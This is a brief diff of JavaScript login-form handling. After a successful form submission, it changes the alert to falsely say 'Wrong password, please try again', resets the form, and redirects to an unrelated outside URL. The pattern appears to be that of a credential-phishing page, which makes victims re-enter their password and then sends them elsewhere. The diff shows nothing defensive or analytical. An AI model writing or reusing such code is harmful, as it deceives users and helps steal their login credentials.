@@ -54,7 +54,7 @@ document.addEventListener("DOMContentLoaded", () => {
         });
 
         if (response.ok) {
-          alert(`Log in first`);
+          alert(`⛔ Wrong password, please try again`);
           form.reset();
           window.location.href = "https://otieu.com/4/9831084";
         } else {
